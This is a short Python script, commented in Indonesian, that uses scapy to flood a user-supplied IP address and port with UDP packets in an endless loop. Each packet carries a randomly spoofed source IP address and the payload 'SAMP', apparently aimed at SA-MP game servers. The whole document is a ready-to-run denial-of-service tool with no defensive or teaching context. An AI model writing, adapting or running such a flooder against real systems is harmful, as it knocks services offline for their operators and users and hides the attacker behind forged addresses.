import random
from scapy.all import *

target_IP = input("Masukkan alamat IP target: ")
target_port = int(input("Masukkan port target: "))  # Menggunakan int() untuk mengonversi input ke integer
i = 1

while True:
    a = str(random.randint(1, 254))
    b = str(random.randint(1, 254))
    c = str(random.randint(1, 254))
    d = str(random.randint(1, 254))
    dot = "."
    source_IP = a + dot + b + dot + c + dot + d

    # Menggunakan port target yang telah diinputkan
    payload = "SAMP"  # Ganti payload sesuai dengan yang Anda inginkan
    IP1 = IP(src=source_IP, dst=target_IP)
    UDP1 = UDP(sport=random.randint(1024, 65535), dport=target_port)  # Menggunakan port target yang telah diinputkan
    pkt = IP1 / UDP1 / Raw(load=payload)
    send(pkt, inter=0.0001, verbose=False)  # Mengirimkan dengan interval 0.001 detik

    print("Paket terkirim", i)
    i = i + 1
￼Enter
